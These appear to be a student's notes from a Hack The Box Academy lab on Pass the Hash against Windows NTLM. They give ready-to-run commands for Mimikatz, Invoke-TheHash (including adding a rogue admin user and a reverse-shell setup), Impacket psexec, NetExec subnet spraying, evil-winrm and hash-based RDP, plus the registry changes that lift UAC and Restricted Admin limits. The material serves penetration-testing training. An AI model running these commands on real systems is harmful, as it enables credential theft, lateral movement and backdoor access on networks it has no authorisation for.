# Pass the Hash (PtH) - [LINK](https://academy.hackthebox.com/app/module/147/section/1638)


## 1. Core Concept: What is PtH?

**Pass the Hash (PtH)** is an attack technique where you use a user's password hash (specifically the NTLM/RC4 hash) to authenticate to a system, completely bypassing the need to know or crack the plaintext password.

**Why does this work?**
Windows uses the NTLM authentication protocol (a challenge-response system) for legacy compatibility. In NTLM, hashes stored on the server are **not salted**. Because the hash is static and directly used in the authentication math, possessing the hash is mathematically equivalent to possessing the password.

**Prerequisites:**
You need administrative privileges on a compromised machine to obtain hashes first. Hashes are typically stolen by:

1. Dumping the local SAM database.
2. Extracting from the Domain Controller's NTDS database (`ntds.dit`).
3. Dumping them straight from memory (`lsass.exe`).

## 2. Performing PtH from Windows

### Tool A: Mimikatz

Mimikatz can spawn a new process (like a command prompt) running in the context of the compromised user using their hash.

* **Command:**
```cmd
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit

```


* **Parameters Explained:**
* `/user`: The user you want to impersonate.
* `/rc4` (or `/NTLM`): The NTLM hash of the user's password.
* `/domain`: The domain name. (Use `.` or `localhost` for local computer accounts).
* `/run`: The program to launch (e.g., `cmd.exe`). *A new command prompt will pop up acting as that user.*



### Tool B: Invoke-TheHash (PowerShell)

A suite of PowerShell functions to perform PtH using WMI or SMB. It does **not** require local admin rights on the machine you are attacking *from*, but the hash you are using must have admin rights on the *target* machine.

**Method 1: Command Execution via SMB**
*(Example: Creates a new user 'mark' and adds them to local Administrators)*

```powershell
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

```

**Method 2: Reverse Shell via WMI**
*(Example: Catching a reverse shell using Invoke-TheHash)*

1. **Set up your listener (on your attack machine):**
```powershell
PS C:\tools> .\nc.exe -lvnp 8001

```


2. **Generate a Base64 PowerShell payload:** Visit [revshells.com](https://www.revshells.com) -> Input your IP/Port -> Select "PowerShell #3 (Base64)".
3. **Execute via WMI:**
```powershell
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "<INSERT_BASE64_POWERSHELL_COMMAND_HERE>"

```

## 3. Performing PtH from Linux (Kali/Parrot)

### Tool A: Impacket

Impacket has several scripts designed for PtH. `psexec` is the most common for getting an interactive SYSTEM shell.

* **Other Impacket tools:** `impacket-wmiexec`, `impacket-atexec`, `impacket-smbexec`.
* **Command (PsExec):**
```bash
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

```


*(Note the colon `:` before the hash. The format is `LMhash:NTLMhash`. If you only have the NTLM hash, leave the LM part blank but keep the colon).*

### Tool B: NetExec (formerly CrackMapExec)

NetExec is perfect for **Password Spraying** (testing one hash against an entire subnet to find where it is valid).

* *Warning:* Spraying domain accounts can cause lockouts. Use `--local-auth` to test local admin accounts safely across a network (great for finding local admin password reuse).
* **Indicator of Success:** Look for `(Pwn3d!)` in the output—this means you have administrative access on that host.
* **Command (Spraying a subnet):**
```bash
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

```


* **Command (Executing a command on a specific host):**
```bash
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

```



### Tool C: Evil-WinRM

Use this if SMB (Port 445) is blocked but WinRM (Port 5985) is open. It gives you a stable PowerShell remoting session.

* **Command:**
```bash
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

```


*(Note: If using a domain account, use `-u username@domain.com`)*

## 4. PtH for GUI Access (RDP)

You can actually get a graphical remote desktop session using just a hash, but there is a major caveat: **Restricted Admin Mode must be enabled on the target.** (It is disabled by default).

**Step 1: Enable Restricted Admin Mode (If you already have shell access)**
You must modify the registry on the target to allow this:

```cmd
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

```

**Step 2: Connect via RDP using `xfreerdp` (From Linux)**

```bash
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

```

## 5. Important Caveat: UAC Limits on Pass the Hash

*If your PtH attack fails but you are 100% sure the hash is correct, this is likely why.*

**The Rule:** User Account Control (UAC) blocks remote administrative tasks for **Local** accounts over network logons.

* **Domain Accounts:** Are immune to this restriction. PtH works fine.
* **The Built-in "Administrator" (RID-500):** Is immune by default. PtH works fine.
* **Other Local Admin Accounts:** Are blocked by default. PtH will fail with "Access Denied".

**The Registry Keys (How to bypass/understand the limits):**

1. `LocalAccountTokenFilterPolicy`: If set to `1`, UAC remote restrictions are lifted, and PtH will work for *all* local admin accounts. (By default, it is `0`).
2. `FilterAdministratorToken`: If set to `1`, UAC enrolls even the built-in RID-500 Administrator. If this is on, PtH will fail even for the default Administrator. (By default, it is `0`).
